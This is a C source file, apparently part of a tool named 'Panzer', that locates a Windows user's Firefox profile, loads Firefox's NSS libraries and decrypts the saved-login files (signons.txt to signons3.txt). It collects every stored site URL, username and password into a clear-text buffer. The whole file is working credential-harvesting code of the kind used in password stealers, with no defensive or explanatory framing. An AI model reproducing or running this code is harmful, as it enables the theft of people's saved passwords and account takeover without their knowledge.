/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */


#include <stdio.h>
#include <windows.h>
#include <Shlwapi.h>
#include "Panzer_Definitions.h"



NSS_Init NSSInit = NULL;
NSS_Shutdown NSSShutdown = NULL;
PK11_GetInternalKeySlot PK11GetInternalKeySlot = NULL;
PK11_CheckUserPassword PK11CheckUserPassword = NULL;
PK11_FreeSlot PK11FreeSlot = NULL;
PK11_Authenticate PK11Authenticate = NULL;
PK11SDR_Decrypt PK11SDRDecrypt = NULL;
PL_Base64Decode PLBase64Decode = NULL;
char gMasterPassword[MAX_BUF_SIZE + 1];
HMODULE gLibNSS = NULL;
HMODULE gLibPLC = NULL;
HMODULE libtmp = NULL;
HMODULE gLibNSPR = NULL;
HMODULE gLibPLDS = NULL;
HMODULE gLibSOFTN = NULL;



/*
 * Check if a directory exists.
 *
 */

int directoryExists(char *pPath)
{
  int lRetVal = 1;
  DWORD lAttr = GetFileAttributes(pPath);
		
  if( (lAttr == -1) || !(lAttr & FILE_ATTRIBUTE_DIRECTORY ) )
    lRetVal = 0;

  return(lRetVal);
}



/*
 * Change all small letters in a string to capital letters.
 *
 */

void lowerCase(char *pBuffer)
{
  int lStringLength = 0;
  int lCounter = 0;

  if (pBuffer != NULL)
  {
    lStringLength = (int) strlen(pBuffer);

    for(; lCounter < lStringLength; lCounter++)
      if( pBuffer[lCounter] >= 65 && pBuffer[lCounter] <= 90)
        pBuffer[lCounter] += 32;
  } // if (pBuffer != NULL)
}





/*
 * Find firefox path where its libraries are present.
 *
 */

char *getFirefoxLibPath(void)
{
  char lTempPath[MAX_BUF_SIZE + 1] = "";
  char *lFFPath = NULL;
  DWORD lPathSize = MAX_BUF_SIZE;
  DWORD lValueType;
  HKEY lValueKey = NULL;
  int lCounter = 0;


  /*
   * Open firefox registry key.
   *
   */

  if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, FIREFOX_REG_PATH, 0, KEY_READ, &lValueKey) != ERROR_SUCCESS)
  {
    lFFPath = NULL;
    goto END;
  } // if(RegOpenKeyEx(HKEY_LO...



  /*
   * Read the firefox path value
   *
   */

  if(RegQueryValueEx(lValueKey, NULL, 0,  &lValueType, (unsigned char*) &lTempPath, &lPathSize) != ERROR_SUCCESS )
  {
    lFFPath = NULL;
    goto END;
  } // if(RegQueryValueEx(lValueKey, NUL...


  if(lPathSize <= 0 || lTempPath[0] == 0)
  {
    lFFPath = NULL;
    goto END;
  }	// if(lPathSize <= 0...



  /*
   * This path may contain extra double quote....
   *
   */

  if(lTempPath[0] == '\"')
    for(lCounter = 0; lCounter < (int) strlen(lTempPath) - 1 ; lCounter++)
      lTempPath[lCounter] = lTempPath[lCounter + 1];


  /*
   * Terminate the string at last "\\"
   *
   */

  for(lCounter = (int) strlen(lTempPath) - 1; lCounter > 0; lCounter--)
  {
    if(lTempPath[lCounter] == '\\')
    {
      lTempPath[lCounter] = 0;
      break;
    } // if( path[lCoun...
  } // for(lCounte...


  if ((lFFPath = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, strlen(lTempPath) + 1)) != NULL)
    strcpy(lFFPath, lTempPath);


END:

  if (lValueKey != NULL)
    RegCloseKey(lValueKey);

  return(lFFPath);
}






/*
 * Determine the firefox profile directory
 *
 */

char *getCurrentUserProfilePath(void)
{
  char lProfilePath[MAX_BUF_SIZE + 1];
  char lProfileFileName[MAX_BUF_SIZE + 1];
  char lFileLine[MAX_BUF_SIZE + 1];
  int  lDefaultFound = 0;
  DWORD lBytesRead = 0;
  HANDLE lProfileHandle = INVALID_HANDLE_VALUE;
  char *lDataBuffer = NULL;
  char *lTempPointer = NULL;
  int lLastPosition = 0;
  char *lRetVal = NULL;
  char *lSlashAt = NULL;
  char *start = NULL;
  int lBufSize = 0;
  FILE *lFH = NULL;



  /*
   * Initialisation.
   *
   */

  ZeroMemory(lProfilePath, sizeof(lProfilePath));
  ZeroMemory(lProfileFileName, sizeof(lProfileFileName));

  lTempPointer = getenv("APPDATA");
  strncpy(lProfilePath, lTempPointer, sizeof(lProfilePath) - 1);

  if (lProfilePath[strlen(lProfilePath) - 1] != '\\')
    strcat(lProfilePath, "\\");

  snprintf(lProfileFileName, sizeof(lProfileFileName) - 1, "%s\\%s\\%s", lProfilePath, FIREFOX_PATH, FIREFOX_PROFILES_FILE);


  /*
   * Get firefox profile directory
   *
   */

  if ((lFH = fopen(lProfileFileName, "r")) != NULL)
  {
    ZeroMemory(lFileLine, sizeof(lFileLine));
    while(fgets(lFileLine, sizeof(lFileLine) - 1, lFH)!= NULL)
    {
      lowerCase(lFileLine);

      if(!lDefaultFound && ( strstr(lFileLine, "name=default") != NULL))
      {
        lDefaultFound = 1;
        continue;
      }


      /*
       * We have got default profile. Check for its path value.
       *
       */

      if(lDefaultFound)
      {
        if(strstr(lFileLine, "path=") != NULL)
        {
          if ((lSlashAt = strstr(lFileLine,"/")) != NULL)
            *lSlashAt = '\\';
		
          /*
           * 
           *
           */

          lFileLine[strlen(lFileLine)-1] = 0;
          start = strstr(lFileLine, "=");
          lBufSize = (int) (strlen(lProfilePath) + strlen(FIREFOX_PATH) + strlen(start) + 3);

          if ((lRetVal = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lBufSize)) != NULL)
            _snprintf(lRetVal, lBufSize - 1, "%s%s%s", lProfilePath, FIREFOX_PATH, start+1);

          break;
        } // if(strstr(lFil...
      } // if(lDefaultFound)
      ZeroMemory(lFileLine, sizeof(lFileLine));
    } // while(fgets(lFileLin...
    fclose(lFH);
  } // if ((lFH = fopen(lProfileF...



  if (lProfileHandle != INVALID_HANDLE_VALUE)
    CloseHandle(lProfileHandle);

  if (lDataBuffer != NULL)
    HeapFree(GetProcessHeap(), 0, lDataBuffer);

  if (lFH != NULL)
    fclose(lFH);


  return(lRetVal);
}



/*
 * Load a DLL within a specific directory.
 *
 */

HMODULE loadLib(char *pFFDir, char *pLibraryName)
{
  char lCWD[MAX_BUF_SIZE + 1];
  HMODULE lRetVal = 0;


  ZeroMemory(lCWD, sizeof(lCWD));
  GetCurrentDirectory(sizeof(lCWD) - 1, lCWD);
  SetCurrentDirectory(pFFDir);

  lRetVal = LoadLibrary(pLibraryName);
  SetCurrentDirectory(lCWD);


  return(lRetVal);
}





/*
 * Load all required DLLs and functions.
 *
 */

int initializeFirefoxLibrary(char *pFFPath)
{
  int lRetVal = 0;

  gLibNSS = NULL;
  gLibPLC = NULL;
  gLibNSPR = NULL;
  gLibPLDS = NULL;
  gLibSOFTN = NULL;


  /*
   * First load the libraries from firefox path.
   *
   */

  if(pFFPath != NULL)
  {

    /*
     *
     *
     */

    if (!(gLibNSPR = loadLib(pFFPath, NSPR_LIBRARY_NAME)))
	{
      if ((gLibNSPR = LoadLibrary(NSS_LIBRARY_NAME)) == NULL)
      {
        lRetVal = 1;
        goto END;
      } // if ((gLib = LoadLib
	} // if (!(gLibNSPR = loa...



    if (!(gLibPLC = loadLib(pFFPath, PLC_LIBRARY_NAME)))
	{
      if ((gLibPLC = LoadLibrary(PLC_LIBRARY_NAME)) == NULL)
      {
        lRetVal = 2;
        goto END;
      } // if ((gLibPLC = LoadLib
	} // if (!(gLibPLC = loa...


    if (!(gLibPLDS = loadLib(pFFPath, PLDS_LIBRARY_NAME)))
	{
      if ((gLibPLDS = LoadLibrary(PLDS_LIBRARY_NAME)) == NULL)
      {
        lRetVal = 3;
        goto END;
      } // if ((gLibPLDS = LoadLib
	} // if (!(gLibPLDS = loa...



    if (!(gLibSOFTN = loadLib(pFFPath, SOFTN_LIBRARY_NAME)))
	{
      if ((gLibSOFTN = LoadLibrary(SOFTN_LIBRARY_NAME)) == NULL)
      {
        lRetVal = 4;
        goto END;
      } // if ((gLibSOFTN = LoadLib
	} // if (!(gLibSOFTN = loa...



    if (!(gLibNSS = loadLib(pFFPath, NSS_LIBRARY_NAME)))
	{
      if ((gLibNSS = LoadLibrary(NSS_LIBRARY_NAME)) == NULL)
      {
        lRetVal = 5;
        goto END;
      } // if ((gLibNSS = LoadLib
	} // if (!(gLibNSS = loa...






    /*
     * Load all the function addresses.
     *
     */

	if (! (NSSInit = (NSS_Init) GetProcAddress(gLibNSS, "NSS_Init")))
	{
      terminateFirefoxLibrary();
      lRetVal = 6;
      goto END;
	}

	if (! (NSSShutdown = (NSS_Shutdown)GetProcAddress(gLibNSS, "NSS_Shutdown")))
	{
      lRetVal = 7;
      goto END;
	}

    if (! (PK11GetInternalKeySlot = (PK11_GetInternalKeySlot) GetProcAddress(gLibNSS, "PK11_GetInternalKeySlot")))
	{
      lRetVal = 8;
      goto END;
	}

    if (! (PK11FreeSlot = (PK11_FreeSlot) GetProcAddress(gLibNSS, "PK11_FreeSlot")))
	{
      lRetVal = 9;
      goto END;
	}

    if (! (PK11Authenticate = (PK11_Authenticate) GetProcAddress(gLibNSS, "PK11_Authenticate")))
	{
      lRetVal = 10;
      goto END;
	}

    if (! (PK11SDRDecrypt = (PK11SDR_Decrypt) GetProcAddress(gLibNSS, "PK11SDR_Decrypt")))
	{
      lRetVal = 11;
      goto END;
	}

    if (! (PK11CheckUserPassword = (PK11_CheckUserPassword ) GetProcAddress(gLibNSS, "PK11_CheckUserPassword")))
	{
      lRetVal = 12;
      goto END;
	}


    if (! (PLBase64Decode = (PL_Base64Decode) GetProcAddress(gLibPLC, "PL_Base64Decode")))
	{
      lRetVal = 13;
      goto END;
	}

  } // if(pFFPath != NULL)

END:

  return(lRetVal);
}





/*
 * 
 *
 */

int initializeNSSLibrary(char *pProfilePath, char *pPassword)
{
  int lRetVal = 0;

  /*
   * Initialize the NSS library
   *
   */

  if( (*NSSInit) (pProfilePath) != SECSuccess)
  {
    terminateFirefoxLibrary();
    lRetVal = 1;
    goto END;
  }


  if((pPassword != NULL) && (strlen(pPassword) > 1023))
  {
    terminateFirefoxLibrary();
    lRetVal = 2;
    goto END;
  }


  /*
   * Setup and check if master password is correct
   *
   */

  if( (pPassword == NULL) || strlen(pPassword) <= 0)
    gMasterPassword[0] = 0;
  else
    strcpy(gMasterPassword, pPassword);
	
  if(checkMasterPassword(gMasterPassword) != 0)
  {
    terminateFirefoxLibrary();
    lRetVal = 3;
    goto END;
  }

END:

  return(lRetVal);
}





/*
 * Terminates and unloads NSS library.
 *   
 */

void terminateFirefoxLibrary(void)
{
  if(NSSShutdown != NULL)
    (*NSSShutdown)();

  if(gLibNSS != NULL)
    FreeLibrary(gLibNSS);

  if(gLibPLC != NULL)
    FreeLibrary(gLibPLC);
}





/*
 * This function reads the firefox signons files and dumps the 
 *  host/username/password information in clear text.
 *
 */

char *dumpFFAccounts(char *pDataBufferAddress, int *pDataBufferSize)
{
  char lTemp[10240];
  char lURL[10240];

  char *lClearText = NULL;
  char *lSignonFilePath = NULL;
  char lSignonFileName1[] = "\\signons.txt";
  char lSignonFileName2[] = "\\signons2.txt";
  char lSignonFileName3[] = "\\signons3.txt";
  FILE *lFH = NULL;

  int lIterationCounter = 0;
  int lTempSize = sizeof(lTemp);
  int lFFVersion = 1;

  char lResourceName[MAX_BUF_SIZE + 1];
  char lResourceType[MAX_BUF_SIZE + 1];
  char lUsername[MAX_BUF_SIZE + 1];
  char lPassword[MAX_BUF_SIZE + 1];
  char *lProfileDir = NULL;
  char *lMasterPassword = NULL;
  char *lFFDir = NULL;
  char *lRetVal = pDataBufferAddress!=NULL?pDataBufferAddress:NULL;



  if((lProfileDir = getCurrentUserProfilePath()) == NULL)
    goto END;


  if(! directoryExists(lProfileDir))
    goto END;


  if((lFFDir = getFirefoxLibPath()) == NULL || initializeFirefoxLibrary(lFFDir) != 0)
    goto END;


  if(initializeNSSLibrary(lProfileDir, lMasterPassword) != 0)
    goto END;


  if ((lSignonFilePath = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, strlen(lProfileDir) + 64 + 1)) == NULL)
    goto END;
	

  strcpy(lSignonFilePath, lProfileDir);
  strcat(lSignonFilePath, lSignonFileName1);



  /*
   * Open the signon file 
   *
   */

  if ((lFH = fopen(lSignonFilePath, "r")) == NULL)
  {
    ZeroMemory(lSignonFilePath, sizeof(lSignonFilePath));
    strcpy(lSignonFilePath, lProfileDir);
    strcat(lSignonFilePath, lSignonFileName2);
    lFFVersion = 2;

    if ((lFH = fopen(lSignonFilePath, "r")) == NULL)
    {
      ZeroMemory(lSignonFilePath, sizeof(lSignonFilePath));
      strcpy(lSignonFilePath, lProfileDir);
      strcat(lSignonFilePath, lSignonFileName3);
      lFFVersion = 3;

      if ((lFH = fopen(lSignonFilePath, "r")) == NULL)
        goto END;

	} // if ((lFH = fopen(lSigno...
  } // if ((lFH = fopen(lSignonFilePa...




  /*
   * Read the Firefox header format information
   * and check if the version information extracted
   * from the signon file is supported by the tool
   *
   */

  ZeroMemory(lTemp, sizeof(lTemp));
  if (fgets(lTemp, sizeof(lTemp) - 1, lFH) == 0)
    goto END;

  StrTrim(lTemp, "\t\r\n");


  // check if the format is right...
  if( ((lFFVersion == 1) && strcmp(lTemp, HEADER_VERSION1) != 0) ||
	  ((lFFVersion == 2) && strcmp(lTemp, HEADER_VERSION2) != 0) ||
	  ((lFFVersion == 3) && strcmp(lTemp, HEADER_VERSION3) != 0) )
    goto END;


  /*
   * Read the reject list.
   *
   */

  while (fgets(lTemp, sizeof(lTemp) - 1, lFH))
  {
    // Check for end of reject list
    if (strlen(lTemp) != 0 && lTemp[0] == '.') 
      break; 
  } // while (fgets(lTemp, s...





  /*
   * Read the URL line 
   *
   */

  while (fgets(lTemp, sizeof(lTemp) - 1, lFH))
  {

    /*
     * Arrange leading and trailing characters (CR and NL).
     *
     */

    while (lTemp[strlen(lTemp) - 1] == '\n' || lTemp[strlen(lTemp) - 1] == '\r')
      lTemp[strlen(lTemp) - 1] = 0;

    lIterationCounter = 0;

    ZeroMemory(lResourceName , sizeof(lResourceName));
    ZeroMemory(lResourceType , sizeof(lResourceType));
    ZeroMemory(lUsername , sizeof(lUsername));
    ZeroMemory(lPassword , sizeof(lPassword));

    strncpy(lResourceName, lTemp, sizeof(lResourceName) - 1);



    /*
     * Read the name/value pairs.
     *
     */

    while (fgets(lTemp, sizeof(lTemp) - 1, lFH))
    {
      /*
       * Arrange leading and trailing characters (CR and NL).
       *
       */

      while (lTemp[strlen(lTemp) - 1] == '\n' || lTemp[strlen(lTemp) - 1] == '\r')
        lTemp[strlen(lTemp) - 1] = 0;


      /*
       * Line starting with . terminates the pairs for this URL entry.
       *
       */

      if (lTemp[0] == '.') 
        break; 


      /*
       * If a valid record was found (we recognize a valid record if it
       * starts with an '*') we save the URL and read username and password.
       */

      if (lTemp[0] == '*') 
      {
        strcpy(lURL, &lTemp[1]);
        if (fgets(lTemp, sizeof(lTemp) - 1, lFH) == 0)
          break;
      } else {
        strcpy(lURL, lTemp);
        if (fgets(lTemp, sizeof(lTemp) - 1, lFH) == NULL)
          break;
      } // if (lTemp[0]...



      while (lTemp[strlen(lTemp) - 1] == '\n' || lTemp[strlen(lTemp) - 1] == '\r')
        lTemp[strlen(lTemp) - 1] = 0;


      /*
       * Decrypt the data buffer.
       *
       */

      if(decryptSecretString(lTemp, &lClearText) == 0)
      {
	    if (lIterationCounter == 0)
          strncpy(lUsername, lClearText, sizeof(lUsername) - 1);
		else 
          strncpy(lPassword, lClearText, sizeof(lPassword) - 1);

        lIterationCounter++;
        lClearText = NULL;
	  } // if(decryptSecretString(lTemp, &cl...
    } // while (fgets(lTemp, siz ...



    /*
     * Print located account data.
     *
     */

    ZeroMemory(lTemp, sizeof(lTemp));
    snprintf(lTemp, sizeof(lTemp) - 1, "%-20s %s\n%-20s %s\n%-20s %s\n\n", "URL", lURL, "Username", lUsername, "Password", lPassword);
    lRetVal = addDataToBuffer(lRetVal, pDataBufferSize, lTemp, strlen(lTemp));
  } // while (fgets(lTemp, siz ...




END:

  if (lFH != NULL)
    fclose(lFH);

  if (lSignonFilePath != NULL)
    HeapFree(GetProcessHeap(), 0, lSignonFilePath);

  if (lClearText != NULL)
    free(lClearText);

  if (lProfileDir)
    HeapFree(GetProcessHeap(), 0, lProfileDir);

  if (lFFDir)
    HeapFree(GetProcessHeap(), 0, lFFDir);

  terminateFirefoxLibrary();


  return(lRetVal);
}



/*
 *   Verifies if the specified master password is correct.
 *   return 1  failure
 *          0  success
 */

int checkMasterPassword(char *pPassword)
{
  PK11SlotInfo *lSlot = 0;
  int lRetVal = 0;

	
  if (! (lSlot = (*PK11GetInternalKeySlot)())) 
  {
    lRetVal = 1;
    goto END;
  } // if (! (lSlot = ...



  /*
   * First check if the master password set
   *
   */

  if(pPassword[0] != 0)
  {
    if((*PK11CheckUserPassword)(lSlot, "") == SECSuccess)
    {
      (*PK11FreeSlot)(lSlot);
      lRetVal = 2;
      goto END;
    } // if((*PK11CheckU...
  } // if(password[0...


  /*
   *
   *
   */

  if( (*PK11CheckUserPassword)(lSlot, pPassword) == SECSuccess )
    lRetVal = 0;
  else	
    lRetVal = 3;



END:

  if (lSlot != NULL)
    (*PK11FreeSlot) (lSlot);

  return(lRetVal);
}



/*
 *
 *
 */

int decryptSecretString(char *pCryptData, char **pClearData)
{
  int lRetVal = 0;
  int lDecodedDataLength = 0;
  char *lDecodedData = NULL;
  int lDecryptedDataLength = 0;
  char *lDecryptedData = NULL;
  unsigned int PREFIX_Len = 0;



  /*
   * Treat zero-length crypt string as a special case.
   *
   */

  if(pCryptData[0] == '\0') 
  {
    *pClearData = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1);
    lRetVal = 1;
    goto END;
  } // if(pCryptData[0] == '\0')...




  /*
   * Use decryption routine...if crypt does not start with prefix...( for Firefox )
   * otherwise use base64 decoding ( for mozilla default installation)
   * For firefox its always encrypted with 3DES.
   *
   */

  if(pCryptData[0] != CRYPT_PREFIX[0]) 
  {
    // First do base64 decoding.....

    if((lDecodedData = base64Decode(pCryptData, &lDecodedDataLength)) == NULL || lDecodedDataLength <= 0)
    {
      lRetVal = 2;
      goto END;
    } // if((lDecodedData = base6...
	


    /*
     * Now do actual PK11 decryption.
     *
     */

    if((PK11Decrypt(lDecodedData, lDecodedDataLength, &lDecryptedData, &lDecryptedDataLength) > 0) || (lDecryptedData == NULL))
    {
      lRetVal = 3;
      goto END;
    } // if((PK11Decrypt(dec...


    /*
     * WARNING: Decrypted string is not NULL terminated 
     * So we will create new NULL terminated string here...
     *
     */

    if ((*pClearData = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lDecryptedDataLength + 1)) == NULL)
    {
      lRetVal = 4;
      goto END;
    } // if ((*pClear...

	
    CopyMemory(*pClearData, lDecryptedData, lDecryptedDataLength);
    *(*pClearData + lDecryptedDataLength) = 0;    // Null terminate the string....
  } else {
	
    /*
     * Just do base64 decoding.
     *
     */

    PREFIX_Len = (int) strlen(CRYPT_PREFIX);
    if(strlen(pCryptData) == PREFIX_Len)
    {
      *pClearData = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1);
      lRetVal = 6;
      goto END;
    } // if(strlen(pCryptDat...


    if((*pClearData = base64Decode(&pCryptData[PREFIX_Len], &lDecodedDataLength)) == NULL)
    {
      lRetVal = 7;
      goto END;
    } // if((*pClearData = base64De...
  } // if(pCryptDa...

END:
  
  return(lRetVal);
}





/*
 * Decrypt passed data buffer.
 *
 */

int PK11Decrypt(char *pEncodedData, int pEncodedDataLength, char **pDecodedData, int *pDecodedDataLength)
{
  PK11SlotInfo *lSlot = NULL;
  SECItem lRequest;
  SECItem lReply;
  int lRetVal = 0;

  /*
   * Find token with SDR key.
   *
   */

  if (! (lSlot = (*PK11GetInternalKeySlot)()))
  { 
    lRetVal = 1;
    goto END;
  } // if (! (lSlo..

	
  if ((*PK11Authenticate)(lSlot, 1, NULL) != SECSuccess)
  {
    lRetVal = 2;
    goto END;
  } // if ((*PK11Authentic...



  /*
   * Decrypt the string.
   *
   */

  lRequest.data = (unsigned char *) pEncodedData;
  lRequest.len = pEncodedDataLength;
  lReply.data = 0;
  lReply.len = 0;

  if ((*PK11SDRDecrypt)(&lRequest, &lReply, NULL) != SECSuccess) 
  {
    lRetVal = 3;
    goto END;
  } // if ((*PK11SDRDec...

  // WARNING : This string is not NULL terminated..
  *pDecodedData = (char*)lReply.data;
  *pDecodedDataLength  = lReply.len;

END:

  if (lSlot != NULL)
    (*PK11FreeSlot)(lSlot);

  return(lRetVal);
}
	




/*
 * Decode a Base64 encoded data buffer.
 *
 */

char *base64Decode(char *pCryptData, int *pDecodeLen)
{
  int lCryptDataSize = (int) strlen(pCryptData);
  int lAdjust = 0;
  char *lRetVal = NULL;

  /*
   * Compute length adjustment.
   *
   */

  if (pCryptData[lCryptDataSize - 1] == '=') 
  {
    lAdjust++;
    if (pCryptData[lCryptDataSize - 2] == '=') 
      lAdjust++;
  } // if (pCryptData[lCryptD ...


  if((lRetVal = (char *)(*PLBase64Decode)(pCryptData, lCryptDataSize, NULL)) != NULL)
    *pDecodeLen = (lCryptDataSize * 3) / 4 - lAdjust;


	return(lRetVal);
}